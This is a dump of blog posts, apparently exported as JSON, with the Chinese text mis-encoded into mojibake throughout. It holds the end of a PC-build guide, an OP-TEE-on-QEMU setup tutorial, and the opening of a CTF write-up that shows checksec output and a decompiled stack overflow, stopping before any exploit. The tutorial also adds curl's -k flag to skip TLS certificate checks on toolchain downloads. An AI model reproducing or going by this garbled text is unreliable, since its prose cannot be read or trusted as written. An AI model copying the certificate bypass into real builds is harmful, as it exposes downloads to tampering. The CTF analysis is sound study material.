10700FKï¼šä¸å¸¦é›†æ˜¾ä¸”å¯è¶…é¢‘çš„cpu\n\næˆ‘å¯¹è¶…é¢‘æ²¡éœ€æ±‚ï¼Œæƒ³è‡ªå·±é…æ˜¾å¡ï¼Œæ‰€ä»¥é€‰äº†ä¸­é—´è¿™ä¸ª10700Få‹å·ã€‚\n\n## 2ã€ä¸»æ¿\n\n[å¾®æ˜Ÿï¼ˆMSIï¼‰MAG B460M MORTAR WIFIè¿«å‡»ç‚®ç”µè„‘ä¸»æ¿](https://item.jd.com/100013654784.html)\n\nä¸»æ¿æˆ‘ç•™æ„äº†æŠ€å˜‰å’Œå¾®æ˜Ÿä¸¤å®¶çš„ï¼Œä¸¤å®¶éƒ½è¿˜ä¸é”™ã€‚å› ä¸ºç¬¬ä¸€æ¬¡é…æœºå™¨ï¼Œæ€•åé¢è£…å¥½åæœ‰å…¼å®¹æ€§ç­‰é—®é¢˜ï¼Œå°±é€‰äº†å¸–å­æ¨èçš„å¾®æ˜Ÿè¿™æ¬¾ã€‚\n\n## 3ã€æ•£çƒ­å™¨\n\n[è¶…é¢‘ä¸‰ï¼ˆPCCOOLERï¼‰ä¸œæµ·X6 CPUæ•£çƒ­å™¨](https://item.jd.com/3311611.html)\n\næ•£çƒ­å™¨åˆ†ä¸ºé£å†·å’Œæ°´å†·ä¸¤ç§ã€‚æ°´å†·æ˜¯æ–°äº§å“ï¼Œæ®è¯´å¾ˆé…·ç‚«å¾ˆçƒ§é’±ï¼Œæ‰€ä»¥æˆ‘å°±é€‰äº†ä¿å®ˆæ´¾é£å†·ã€‚ç›®å‰è§‰å¾—ä¹ŸæŒºå¥½ç”¨çš„ã€‚\n\n## 4ã€å†…å­˜æ¡\n\n[ç¾å•†æµ·ç›—èˆ¹(USCORSAIR)DDR4 3000 32GB(16GÃ—2)å¥—è£… å°å¼æœºå†…å­˜æ¡ å¤ä»‡è€…LPXç³»åˆ— æ¸¸æˆå‹](https://item.jd.com/1990572.html#crumb-wrap)\n\nå†…å­˜æ¡å¯ä»¥æ ¹æ®è‡ªå·±å®é™…éœ€è¦æ¥é€‰ï¼Œæˆ‘è§‰å¾—æ˜¯è¶Šå¤§è¶Šå¥½ã€‚å…¬å¸å¤§éƒ¨åˆ†ç”µè„‘éƒ½æ˜¯32gçš„ï¼Œä¹‹å‰æˆ‘çš„ç¬”è®°æœ¬æ˜¯16gï¼Œæ„Ÿè§‰32gå¯¹äºç›®å‰å¤§éƒ¨åˆ†å·¥ä½œæ¥è¯´æ˜¯å®Œå…¨å¤Ÿç”¨äº†çš„ã€‚\n\nå†…å­˜æ¡çš„å‚å•†æœ‰é‡‘å£«é¡¿ï¼Œæµ·ç›—èˆ¹ç­‰ç­‰ã€‚æˆ‘é€‰äº†æµ·ç›—èˆ¹16g*2çš„ï¼Œä¸ºä»€ä¹ˆä¸ç›´æ¥ä¹°32gå‘¢ï¼Ÿå› ä¸ºä¸»æ¿æœ‰4ä¸ªå†…å­˜æ¡æ’æ§½ï¼Œæ®è¯´1å’Œ3ï¼Œ2å’Œ4å„è‡ªç»„åˆèµ·æ¥ç”¨æ•ˆç‡æ˜¯æœ€é«˜çš„ï¼Œæ‰€ä»¥ä¹°ä¸¤æ¡å……åˆ†å‘æŒ¥ä¸€ä¸‹ä¸»æ¿çš„ä½œç”¨ã€‚\n\n## 5ã€ç¡¬ç›˜\n\n[è¥¿éƒ¨æ•°æ®ï¼ˆWestern Digitalï¼‰1TB SSDå›ºæ€ç¡¬ç›˜ M.2æ¥å£(NVMeåè®®) WD_BLACK SN750](https://item.jd.com/100002206075.html#crumb-wrap)\n\nç¡¬ç›˜æœ‰å›ºæ€ç¡¬ç›˜å’Œæœºæ¢°ç¡¬ç›˜ä¹‹åˆ†ï¼Œè€ƒè™‘é€Ÿåº¦é—®é¢˜ï¼Œæˆ‘ä¹°äº†ä¸€å—1Tçš„å›ºæ€ç¡¬ç›˜ï¼Œæ²¡æœ‰ä¹°æœºæ¢°ç¡¬ç›˜ã€‚å¦‚æœåé¢å›ºæ€ç¡¬ç›˜ä¸å¤Ÿç”¨äº†å†è€ƒè™‘ä»ä¹°æœºæ¢°ç¡¬ç›˜ã€‚\n\nç¡¬ç›˜æ¯”è¾ƒæœ‰åçš„å‚å•†æ˜¯è¥¿éƒ¨æ•°æ®ï¼Œä¸‰æ˜Ÿï¼Œä¸œèŠï¼Œè”æƒ³ç­‰ç­‰ï¼Œå¯ä»¥æŒ‘è‡ªå·±å–œæ¬¢çš„ã€‚æ®è¯´è¥¿éƒ¨æ•°æ®è¿™ä¸ªé»‘ç›˜å¾ˆå¥½ï¼Œæ‰€ä»¥æˆ‘å°±ä¹°æ¥è¯•è¯•ã€‚\n\n## 6ã€æ˜¾å¡\n\n[åç¡• ï¼ˆASUSï¼‰ç”µç«ç‰¹å·¥TUF-GeForce RTX 2060-O6G-GAMING 14000MHz 1365-1740MHzæ¸¸æˆæ˜¾å¡6G](https://item.jd.com/100003292738.html)\n\næœ¬æ¥æ˜¯æƒ³ä¹°ä¸Šé¢è¿™å¼ æ˜¾å¡çš„ï¼Œä½†æ˜¯æ²¡æŠ¢åˆ°ã€‚ä»Šå¹´å¥½åƒæ˜¾å¡ç‰¹åˆ«æŠ¢æ‰‹ï¼Ÿçœ‹äº†å‡ ç¯‡å¸–å­æ˜¯è¿™ä¹ˆè¯´çš„ï¼Œè¯´ä¸æ¨èç°åœ¨ä¹°æ˜¾å¡ã€‚\n\nç”±äºæˆ‘ä¹°çš„CPUæ˜¯ä¸å¸¦é›†æ˜¾çš„ï¼Œæ‰€ä»¥æš‚æ—¶ä¹°äº†ä¸ªå‡ ç™¾å—çš„ä¾¿å®œæ˜¾å¡è¿‡æ¸¡ä¸€ä¸‹ã€‚\n\n## 7ã€ç”µæº\n\n[å®‰é’›å…‹(Antec)VP550é“œç‰Œ å°å¼æœºç”µè„‘ä¸»æœºæœºç®±ç”µæºé“œç‰Œ550W](https://item.jd.com/7254027.html)\n\nç”µæºå…¶å®æˆ‘ä¹Ÿä¸å¤ªä¼šé€‰ã€‚å¦‚æœCPUã€æ˜¾å¡ç­‰ç»„ä»¶æ€§èƒ½è¶Šé«˜åŠŸç‡å¾ˆå¤§çš„è¯ï¼Œå°±éœ€è¦ä¹°å¤§åŠŸç‡çš„ç”µæºæ‰èƒ½å‘æŒ¥å®ƒä»¬çš„æœ€é«˜æ€§èƒ½ã€‚æˆ‘è¿™ä¸ªç®—æ˜¯ä¸€èˆ¬èˆ¬çš„é…ç½®å§ï¼Œå°±æŒ‰ç…§çŸ¥ä¹å¸–å­ä¸Šæ¨èçš„ä¹°äº†550Wçš„ã€‚\n\n## 8ã€æœºç®±\n\n[å…ˆé©¬ï¼ˆSAMAï¼‰å¦å…‹3 ç”µè„‘ä¸»æœºç®± æ”¯æŒATXä¸»æ¿](https://item.jd.com/100003124872.html)\n\næˆ‘ä¹°çš„è¿™ä¸ªæœºç®±å¤ªå¤§äº†ã€‚ã€‚ã€‚ä½†æ˜¯åˆæ‡’å¾—é€€è´§äº†ï¼Œæƒ³ç€åæ­£ä¸€ç›´æ”¾åœ¨å®¶é‡Œå°±éšå®ƒå§ã€‚å¦‚æœä¸»æ¿ä¸æ˜¯å¾ˆå¤§ï¼Œä¹Ÿæ²¡æœ‰å¾ˆå¤šæœºæ¢°ç¡¬ç›˜æˆ–å›ºæ€ç¡¬ç›˜éœ€è¦ç©ºé—´çš„è¯ï¼Œå»ºè®®å¥³å­©å­ä¹°ä¸ªå°æœºç®±å°±å¯ä»¥äº†/(ã„’oã„’)/~~\n\n## 9ã€å¤–è®¾\n\nå¤–è®¾å°±æ˜¯é”®ç›˜é¼ æ ‡æ˜¾ç¤ºå™¨è¿™äº›ï¼Œå¯ä»¥æ ¹æ®ä¸ªäººå–œå¥½å»ä¹°ï¼Œæˆ‘å°±ä¸æ¨èå•¦ã€‚\n\n# ç¬¬äºŒæ­¥ï¼Œç»„è£…\n\nè¯´å®è¯ï¼Œå½“æˆ‘æŠŠæ‰€æœ‰ç»„ä»¶æ‹†å¼€åï¼Œå‡†å¤‡å¼€å§‹ç»„è£…çš„æ—¶å€™ï¼Œæˆ‘åæ‚”äº†ã€‚ä¸ºä»€ä¹ˆè¦ç»™è‡ªå·±æ‰¾è¿™ä¹ˆå¤§çš„éº»çƒ¦/(ã„’oã„’)/~~\n\næœ¬æ¥ä»¥ä¸ºå°±åƒæ­ç§¯æœ¨ä¸€æ ·ï¼Œæ‹¼ä¸€æ‹¼å°±å¯ä»¥äº†ã€‚\n\næœ€å›°éš¾çš„éƒ¨åˆ†æ˜¯æ•£çƒ­å™¨çš„å®‰è£…ï¼Œå¹¸å¥½åœ¨bilibiliä¸Šæ‰¾åˆ°ä¸€ä¸ªå¾ˆè¯¦ç»†çš„ç»„è£…æ•™ç¨‹ï¼ŒçœŸçš„æ˜¯æ•‘å‘½æ•™ç¨‹â€”â€”[ã€è£…æœºæ•™ç¨‹ã€‘è¿™å¯èƒ½æ˜¯ä½ èƒ½åœ¨ç½‘ä¸Šæ‰¾åˆ°æœ€è¯¦ç»†çš„è£…æœºæ•™ç¨‹](https://www.bilibili.com/video/BV1jE411e7hw?t=1605)ã€‚ä¸ºäº†è¡¨ç¤ºæˆ‘çš„æ„Ÿè°¢ï¼Œç¬¬ä¸€æ¬¡åœ¨bç«™ä¸Šè´¡çŒ®å‡ºäº†2ä¸ªå¸ï¼Œå“ˆå“ˆå“ˆã€‚\n\nè£…æœºå®Œæˆåå®¢å…å·²ç»è¢«æˆ‘æŠ˜ç£¨æˆè¿™æ ·äº†ã€‚\n\n![](messmess.jpg)\n\n# ç¬¬ä¸‰æ­¥ï¼Œè£…ç³»ç»Ÿ\n\nä¸‹é¢è¿™ä¸ªè§†é¢‘é‡Œè®²çš„å¾ˆæ¸…æ¥šï¼Œæˆ‘å°±ä¸åšé‡å¤å·¥ä½œäº†ã€‚ åœ¨å¦ä¸€å°win10ç”µè„‘ä¸Šè®¿é—®å®˜ç½‘ï¼Œä¸‹è½½å®˜æ–¹å·¥å…·åˆ¶ä½œUç›˜å¯åŠ¨ç›˜ã€‚\n\n[ã€è£…æœºæ•™ç¨‹ã€‘è¶…è¯¦ç»†WIN10ç³»ç»Ÿå®‰è£…æ•™ç¨‹ï¼Œå®˜æ–¹ISOç›´è£…ä¸PEä¸¤ç§æ–¹æ³•æ•™ç¨‹ï¼ŒUEFI+GUIDåˆ†åŒºä¸Legacy+MBRåˆ†åŒº](https://www.bilibili.com/video/av77344372)\n\n# ç¬¬å››æ­¥ï¼Œè£…é©±åŠ¨\n\nè¿™ä¹Ÿæ˜¯å¾ˆé‡è¦çš„ä¸€æ­¥ï¼Œä¸»æ¿ã€æ˜¾å¡ã€å¤–è®¾ç­‰ä¸ºäº†å‘æŒ¥æœ€å¥½çš„ä½œç”¨ï¼Œéœ€è¦æ›´æ–°ä»–ä»¬çš„é©±åŠ¨ã€‚æ–¹æ³•å°±æ˜¯è®¿é—®å¯¹åº”çš„å®˜ç½‘ï¼Œæ‰¾åˆ°å‹å·ï¼Œä¸‹è½½å®‰è£…å°±å¯ä»¥äº†ã€‚å…·ä½“å¯ä»¥å‚è€ƒä¸‹é¢è¿™ä¸ªè§†é¢‘ã€‚\n\n[ã€è£…æœºæ•™ç¨‹ã€‘é©±åŠ¨ç¨‹åºæ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Ÿä¸ºä»€ä¹ˆè¦å®‰è£…é©±åŠ¨ç¨‹åºï¼Ÿå¦‚ä½•æ­£ç¡®å®˜æ–¹çš„å®‰è£…çº¯å‡€ç‰ˆé©±åŠ¨ï¼Ÿ](https://www.bilibili.com/video/av84597019?spm_id_from=333.788.b_636f6d6d656e74.7)","categories":["Others"]},{"title":"åŸºäºqemuçš„opteeæ¨¡æ‹Ÿç¯å¢ƒæ­å»º","url":"/2020/12/20/qemuv8-optee/","content":"\nå¾ˆæ—©ä¹‹å‰ï¼Œå‚è€ƒCSDNåšä¸»â€œæ¼‚æµçš„çŒ´å­â€çš„ä¸¤ç¯‡åšå®¢[0.ä½¿ç”¨Qemuè¿è¡ŒOP-TEE](https://icyshuai.blog.csdn.net/article/details/71499619)å’Œ[OP-TEE_3.6.0çš„qemuè¿è¡ŒéªŒè¯](https://icyshuai.blog.csdn.net/article/details/99855105)ï¼Œå°è¯•æ­å»ºè¿‡opteeçš„æ¨¡æ‹Ÿæ‰§è¡Œç¯å¢ƒï¼Œä½†æ— è®ºæ˜¯åœ¨å®¶é‡Œè¿˜æ˜¯åœ¨å…¬å¸é‡Œï¼Œéƒ½å› ä¸ºç½‘ç»œæˆ–å…¶ä»–è«åçš„åŸå› è€Œæ²¡æœ‰æˆåŠŸã€‚\n\nè¿™æ¬¡ï¼Œè¯¯æ‰“è¯¯æ’çœ‹åˆ°äº†opteeå®˜æ–¹æ–‡æ¡£ä¸­çš„æ­å»ºæ–¹æ³•â€”â€”[Build and run](https://optee.readthedocs.io/en/latest/building/index.html)ï¼ŒæŠ±ç€å°è¯•çš„å¿ƒæ€ï¼Œç«Ÿç„¶æ­å»ºæˆåŠŸäº†ï¼æ‰€ä»¥åšä¸ªè®°å½•ã€‚\n\næˆ‘ç”¨åˆ°çš„ç¯å¢ƒå¦‚ä¸‹ï¼š\n\n- windows 10ä¸Šå®‰è£…çš„virtualbox 6.1.6ç‰ˆæœ¬ã€‚è¿™ä¸ªç‰ˆæœ¬åº”è¯¥æ— æ‰€è°“ã€‚\n\n- è™šæ‹Ÿæœºçš„ç³»ç»Ÿæ˜¯Ubuntu 18.04ã€‚\n- å®‰è£…çš„opteeç‰ˆæœ¬æ˜¯3.8.0ã€‚\n\nè¿™é‡Œè¦æä¸¤ä¸ªç‚¹ï¼Œä¸€å¼€å§‹æˆ‘ç”¨çš„æ˜¯Ubuntu 16.04ç‰ˆæœ¬å®‰è£…optee 3.6.0ï¼Œä½†æ˜¯åœ¨å®‰è£…ä¾èµ–çš„æ—¶å€™ä¸€ç›´æŠ¥ä¸‹é¢è¿™ä¸ªé”™ï¼Œæ‰€ä»¥æˆ‘å°±æ¢æˆäº†Ubuntu 18.04ã€‚\n\n```shell\nE: Unable to locate package python3-pycryptodome\n```\n\nåœ¨Ubuntu 18.04ä¸Šrepo initçš„æ—¶å€™åˆæŠ¥äº†ä¸€ä¸ªé”™ï¼ˆå…·ä½“æ˜¯å•¥å¿˜è®°äº†ï¼‰ï¼ŒåŸå› æ˜¯repoç‰ˆæœ¬å’Œopteeç‰ˆæœ¬ä¸å…¼å®¹ã€‚è¦ä¹ˆé™ä½repoçš„ç‰ˆæœ¬ï¼ˆä»2.xåˆ°1.xï¼‰ï¼Œè¦ä¹ˆä½¿ç”¨æ–°ç‰ˆæœ¬çš„opteeã€‚æˆ‘é€‰æ‹©äº†åè€…ï¼Œä½¿ç”¨Ubuntu 18.04ï¼Œrepo 2.xç‰ˆæœ¬å®‰è£…opteeçš„3.8.0ç‰ˆæœ¬ï¼Œæœ€ç»ˆç¯å¢ƒæ­å»ºæˆåŠŸã€‚\n\n# 1 å®‰è£…ä¾èµ–\n\nï¼ˆ1ï¼‰å› ä¸ºå®‰è£…çš„æ˜¯64ä½çš„ubuntuï¼Œæ‰€ä»¥å…ˆä½¿èƒ½ç³»ç»Ÿå¯¹i386çš„æ”¯æŒã€‚\n\n```shell\n$ sudo dpkg --add-architecture i386\n$ sudo apt-get update\n```\n\nï¼ˆ2ï¼‰å®‰è£…æ‰€æœ‰éœ€è¦ç”¨åˆ°çš„packagesã€‚\n\n```shell\n$ sudo apt-get install android-tools-adb android-tools-fastboot autoconf \\\n        automake bc bison build-essential ccache cscope curl device-tree-compiler \\\n        expect flex ftp-upload gdisk iasl libattr1-dev libcap-dev \\\n        libfdt-dev libftdi-dev libglib2.0-dev libhidapi-dev libncurses5-dev \\\n        libpixman-1-dev libssl-dev libtool make \\\n        mtools netcat python-crypto python3-crypto python-pyelftools \\\n        python3-pycryptodome python3-pyelftools python-serial python3-serial \\\n        rsync unzip uuid-dev xdg-utils xterm xz-utils zlib1g-dev\n```\n\n# 2 å®‰è£…android repo\n\nå¦‚æœç³»ç»Ÿä¹‹å‰æ²¡æœ‰androidçš„å¼€å‘ç¯å¢ƒï¼Œæ²¡æœ‰å®‰è£…è¿‡repoçš„è¯ï¼Œå¯ä»¥å°†repoä¸‹è½½åˆ°æœ¬åœ°ï¼Œç„¶åæ·»åŠ åˆ°ç¯å¢ƒå˜é‡ä¸­ã€‚\n\n```shell\n$ mkdir ~/bin\n$ vim ~/.bashrc\n\texport PATH=~/bin:$PATH\n$ source ~/.bashrc\n$ curl https://storage.googleapis.com/git-repo-downloads/repo > ~/bin/repo\n$ chmod a+x ~/bin/repo\n```\n\n# 3 è·å–æºç \n\né€šè¿‡githubä¸Šop-teeé¡¹ç›®ä¸­çš„manifestæŒ‡å®šç‰ˆæœ¬æ¥è·å–æ‰€éœ€çš„æºç ï¼Œè¿™ç§æ–¹æ³•å¯¹äºæ–°æ‰‹æ¥è¯´å¿«æ·çœäº‹ã€‚ï¼ˆrepoä¹‹å‰éœ€è¦è®¾ç½®å¥½gitçš„ä»£ç†ï¼Œä¿è¯èƒ½é€šè¿‡gitè®¿é—®å¤–ç½‘ï¼‰\n\n```shell\n$ mkdir -p optee\n$ cd optee\n$ repo init -u https://github.com/OP-TEE/manifest.git -m qemu_v8.xml -b 3.8.0\n$ repo sync -j4 --no-clone-bundle\n```\n\nä»¥ä¸Šå‘½ä»¤æ‰§è¡Œå®Œå¦‚æœæ²¡æœ‰ä»»ä½•é—®é¢˜çš„è¯ï¼Œå°±å¯ä»¥ç›´æ¥è·³åˆ°ç¬¬4æ­¥å»ä¸‹è½½toolchainäº†ã€‚\n\nä½†æ˜¯å¾ˆä¸å¹¸ï¼Œæˆ‘åœ¨`sync`çš„æ—¶å€™é‡åˆ°äº†è¿™ä¸ªé”™è¯¯â€”â€”`â€œGnuTLS recv error (-110): The TLS connection was non-properly terminatedâ€`ï¼Œæœ€åæˆåŠŸçš„[è§£å†³åŠæ³•](https://stackoverflow.com/questions/52529639/gnutls-recv-error-110-the-tls-connection-was-non-properly-terminated)æ˜¯é‡è£…gitï¼Œæ­¥éª¤å¦‚ä¸‹ã€‚\n\n```shell\n$ sudo apt-get install build-essential fakeroot dpkg-dev -y\n$ sudo apt-get build-dep git -y\n$ sudo apt-get install libcurl4-openssl-dev -y\n$ cd ~\n$ mkdir source-git\n$ cd source-git/\n$ apt-get source git\n$ cd git-2.*.*/\n$ sed -i -- 's/libcurl4-gnutls-dev/libcurl4-openssl-dev/' ./debian/control\n$ sed -i -- '/TEST\\s*=\\s*test/d' ./debian/rules\n$ dpkg-buildpackage -rfakeroot -b -uc -us\n$ sudo dpkg -i ../git_*ubuntu*.deb\n```\n\n# 4 ä¸‹è½½toolchains\n\nç¼–è¯‘ä¸åŒæ¶æ„çš„op-teeæ—¶ï¼Œéœ€è¦ç”¨åˆ°ä¸åŒçš„toolchainï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦äº‹å…ˆä¸‹è½½å¥½ã€‚\n\n```shell\n$ cd ~/optee/build\n$ make -j2 toolchains\n```\n\nå¦‚æœä»¥ä¸Šå‘½ä»¤æ‰§è¡Œæ²¡æœ‰é—®é¢˜çš„è¯ï¼Œç»§ç»­å»ç¬¬5æ­¥å°±å¥½å•¦ã€‚\n\næˆ‘è¿™é‡Œé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼š\n\n- makeæŠ¥é”™ï¼Œæç¤ºåœ¨æŒ‡å®šçš„ç›®å½•ä¸­æ²¡æœ‰taråŒ…ã€‚\n\n  æˆ‘ä»”ç»†ç ”ç©¶äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯æ²¡æœ‰ä¸‹è½½ä¸‹æ¥ã€‚äºæ˜¯æ‰“å¼€buildç›®å½•ä¸‹çš„toolchain.mkçœ‹äº†çœ‹è¿™ä¸ªè„šæœ¬çš„å®ç°ã€‚è„šæœ¬ç¬¬25è¡Œæ˜¯`curl -s -L $(2) -o $(TOOLCHAIN_ROOT)/$(3).tar.xz;`ï¼Œç›®çš„æ˜¯ä¸‹è½½ä¸€ä¸ªtaråŒ…ã€‚å»æ‰`-s`çœ‹çœ‹ä¸‹è½½æ—¶åˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆã€‚æœä¸å…¶ç„¶ï¼Œæœ‰é”™è¯¯æç¤º`curl: (60) SSL certificate problem: unable to get local issuer certificate`ã€‚è¿™æ˜¯è¯ä¹¦çš„é—®é¢˜ï¼Œæœ‰ä¸¤ç§æ–¹æ¡ˆï¼šä¸€ç§æ˜¯åœ¨æœ¬åœ°å®‰è£…è¯ä¹¦ï¼Œå¦ä¸€ç§æ˜¯curlä¸‹è½½æ—¶åŠ ä¸Š`-k`å‚æ•°è·³è¿‡è¯ä¹¦æ£€æŸ¥ã€‚æˆ‘é€‰æ‹©ç¬¬äºŒç§ï¼Œå› æ­¤å°†toolchain.mkä¸­çš„ç¬¬25è¡Œæ”¹æˆ`curl -k -L $(2) -o $(TOOLCHAIN_ROOT)/$(3).tar.xz;`ï¼Œç„¶åå°±å¯ä»¥æˆåŠŸä¸‹è½½toolchainå•¦ã€‚\n\n# 5 ç¼–è¯‘æ•´ä¸ªå·¥ç¨‹\n\nå› ä¸ºåœ¨ä¸€å¼€å§‹å·²ç»è®¾ç½®è¿‡repo manifestsäº†ï¼Œæ‰€ä»¥ç¼–è¯‘çš„æ—¶å€™å¯ä»¥ä¸æŒ‡å®šç‰ˆæœ¬ï¼Œç›´æ¥è¿è¡Œmakeã€‚\n\n```shell\n$ cd ~/optee/build\n$ make -j4\n# æˆ–è€…ï¼Œå°†ç¼–è¯‘è¾“å‡ºé‡å®šå‘åˆ°logä¸­ï¼Œæ–¹ä¾¿ç¼–è¯‘å‡ºé—®é¢˜äº†å®šä½\n$ make 2>&1 | tee build.log\n```\n\n# 6 è¿è¡Œoptee\n\nåœ¨buildç›®å½•ä¸‹æ‰§è¡Œmake run\n\n```shell\n$ cd ~/optee/build\n$ make run\n```\n\næ‰§è¡Œå®Œåï¼Œä¸€å…±ä¼šæœ‰ä¸‰ä¸ªçª—å£ï¼šqemuï¼Œéå®‰å…¨ä¸–ç•Œï¼Œå®‰å…¨ä¸–ç•Œã€‚å‰ä¸¤ä¸ªçª—å£æœ‰shellï¼Œå®‰å…¨ä¸–ç•Œçš„çª—å£åªæœ‰æ—¥å¿—è¾“å‡ºã€‚\n\nåœ¨qemuçª—å£ä¸­æ‰§è¡Œ`c`ï¼Œç„¶åå°±å¯ä»¥åœ¨éå®‰å…¨ä¸–ç•Œçš„shellä¸­æ‰§è¡Œ`xtest`è¿›è¡Œæµ‹è¯•ã€‚\n\n```\nQEMU console:         (qemu) c\nNormal world shell:   # xtest\n```\n\nåˆ°æ­¤ï¼Œæ•´ä¸ªåŸºäºqemuçš„opteeç¯å¢ƒå°±ç®—æ­å»ºå®Œæˆäº†ï¼Œåç»­å¯ä»¥è‡ªç”±åœ°è¿›è¡Œåˆ†æå’ŒéªŒè¯ã€‚\n\n# 7 opteeä»£ç ç›®å½•ç»“æ„\n\nä¸€å¼€å§‹ä¸æ˜ç™½ä¸ºä»€ä¹ˆmanifestä¸‹çš„default.xmlå’Œqemu_v8.xmlä¸¤è€…ä»£ç ç›®å½•ä¸ä¸€æ ·ï¼Œæœ€æ˜æ˜¾çš„ï¼Œå‰è€…æœ‰ubootè€Œåè€…æ²¡æœ‰ï¼Œé‚£åè€…æ˜¯ç”¨ä»€ä¹ˆå¼•å¯¼å¯åŠ¨çš„å‘¢ï¼Ÿ\n\nå…¶å®ï¼Œdefault.xmlç¼–è¯‘çš„æ˜¯32ä½çš„opteeï¼Œè€Œqemu_v8.xmlç¼–è¯‘çš„æ˜¯64ä½çš„ã€‚64ä½çš„opteeä½¿ç”¨UEFI-EDK2æ›¿æ¢æ‰äº†ubootï¼Œå¹¶å¼•å…¥åŠ å¯†ç»„ä»¶mbedtlsã€‚è¿™é‡Œå‚è€ƒäº†[OPEN-TEEä»£ç ç›®å½•ç»“æ„åŠç¼–è¯‘ç›®æ ‡](https://www.xiezeyang.com/2020/08/16/Security/OPEN-TEE%E4%BB%A3%E7%A0%81%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E5%8F%8A%E7%BC%96%E8%AF%91%E7%9B%AE%E6%A0%87/)è¿™ç¯‡æ–‡ç« æ‰å¼„æ‡‚çš„ã€‚\n\nä»¥qemu_v8.xmlä¸­çš„ä»£ç ç›®å½•ä¸ºä¾‹ï¼Œå¦‚ä¸‹æ˜¯ç¼–è¯‘å®Œæˆåçš„çŠ¶æ€ï¼Œoutå’Œout-bræ˜¯ç¼–è¯‘è¿‡ç¨‹ä¸­åˆ›å»ºçš„ç›®å½•ã€‚\n\n```\nbuild/ - ä¸åŒå¹³å°çš„makefileåŠkconfig\nbuildroot/ - ä¸€æ¬¾ç¼–è¯‘å·¥å…·\nedk2/ - éµå¾ªUEFIæ ‡å‡†çš„bootloaderæºç \nlinux/ - linux kernelæºç \nmbedtls/ - å¼€æºçš„ssl/tlsåŠ å¯†ç»„ä»¶ï¼Œè½»é‡çº§\noptee_benchmark/ - open-teeé¡¹ç›®åŸºå‡†æ¡†æ¶çš„æºç \noptee_client/ - open-teeé¡¹ç›®çš„éå®‰å…¨ä¾§æºç \noptee_examples/ - open-teeä¸­ä½¿ç”¨çš„ç¤ºä¾‹CAå’ŒTAæºç \noptee_os/ - open-teeé¡¹ç›®çš„osæºç \noptee_test/ - æµ‹è¯•å¥—ä»¶xtestæºç \nout/ - å­˜å‚¨ç¼–è¯‘ç”Ÿæˆç”¨äºçƒ§å½•çš„imageï¼Œå¦‚bl1.bin, bl2.binç­‰\nout-br/ - å­˜æ”¾buildrootå·¥å…·ç¼–è¯‘ç”Ÿæˆçš„æ–‡ä»¶\nqemu/ - qemuæºç \n.repo/ - repoå·¥ç¨‹\nsoc_term/ - ç›‘å¬qemuã€éå®‰å…¨ç»ˆç«¯ã€å®‰å…¨ç»ˆç«¯ä¸‰ä¸ªç«¯å£ï¼Œæ­£ç¡®å°†logé‡å®šå‘è‡³å¯¹åº”çš„ç»ˆç«¯\ntoolchains/ - åŒ…å«ç¼–è¯‘æ‰€éœ€çš„å·¥å…·é“¾\ntrusted-firmware-a/ - atfæºç \n```\n\n# 8 åç»­ç ”ç©¶\n\nåé¢è®¡åˆ’å‚è€ƒã€Šæ‰‹æœºå®‰å…¨å’Œå¯ä¿¡åº”ç”¨å¼€å‘æŒ‡å—ã€‹åŠ[OP-TEE documentation](https://optee.readthedocs.io/en/latest/general/index.html)å¯¹å„ä¸ªæ¨¡å—æ›´æ·±å…¥åœ°åˆ†æã€‚\n\nå¦ä¸€ä¸ªä»»åŠ¡æ˜¯åˆ†æä¸€äº›[op-teeå†å¹´æ¼æ´](https://www.op-tee.org/security-advisories/)ã€‚","categories":["OP-TEE"]},{"title":"hitctf2020ä¹‹dagongren1","url":"/2020/12/05/hitctf2020-dagongren1/","content":"\n> è¿™æ˜¯ç¬¬ä¸€æ¬¡åœ¨æ¯”èµ›çš„æ—¶å€™æŠŠé¢˜ç›®ç»™åšå‡ºæ¥äº†å˜»å˜»å˜»ã€‚æ„Ÿè°¢ç‹è€å¸ˆï¼Œä¸ºäº†è®©æˆ‘æŠŠè¿™é¢˜åšå®Œè¿˜è¯·æˆ‘åƒçƒ§çƒ¤ï¼Œæ­¤å¤„å¿…é¡»ç»™ç‹è€å¸ˆå‘ä¸€å¼ è¶…çº§Superæ— æ•Œå¥½äººå¡ï¼[ç‹—å¤´...]\n\n# 1 æ¼æ´ç‚¹\n\né¢˜ç›®ä¸‹è½½ï¼š[dagongren1](dagongren1)\n\né¦–å…ˆçœ‹ä¸€ä¸‹ç¨‹åºçš„åŸºæœ¬æƒ…å†µã€‚\n\n```shell\nbling@bling:~/Desktop$ file dagongren1 \ndagongren1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e5adcd14da3eedce7b1b4c36d62d68bd687e63bc, not stripped\nbling@bling:~/Desktop$ checksec dagongren1 \n[*] '/home/bling/Desktop/dagongren1'\n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x400000)\n    RWX:      Has RWX segments\n```\n\nx86æ¶æ„ä¸‹çš„64ä½ç¨‹åºï¼Œæ ˆcookieã€NXã€PIEéƒ½æ²¡å¼€ï¼Œè¿˜æœ‰å¯è¯»å¯å†™å¯æ‰§è¡Œçš„æ®µï¼Œçœ‹èµ·æ¥è¿™ä¸ªé¢˜åˆ©ç”¨æ—¶æ²¡ä»€ä¹ˆéšœç¢ã€‚è¿è¡Œä¸€ä¸‹ç¨‹åºï¼Œç„¶åçœ‹çœ‹IDAåæ±‡ç¼–çš„æºç ï¼Œåˆ†æä¸€ä¸‹æ¼æ´ç‚¹ã€‚\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char v4[32]; // [rsp+0h] [rbp-20h] BYREF\n\n  puts(\"Good morning master\");\n  puts(aWorkHardForYou);\n  puts(\"Come On\");\n  _isoc99_scanf(\"%s\", v4);\n  fclose(stdout);\n  fclose(stderr);\n  return 0;\n}\n```\n\nå¯ä»¥çœ‹åˆ°scanfæ—¶æœ‰ä¸ªæ ˆæº¢å‡ºï¼Œæº¢å‡ºå¯ä»¥è¦†ç›–mainå‡½æ•°è¿”å›åœ°å€ï¼Œé‚£ä¹ˆè¿™å°±æ§åˆ¶äº†eipã€‚\n\n# 2 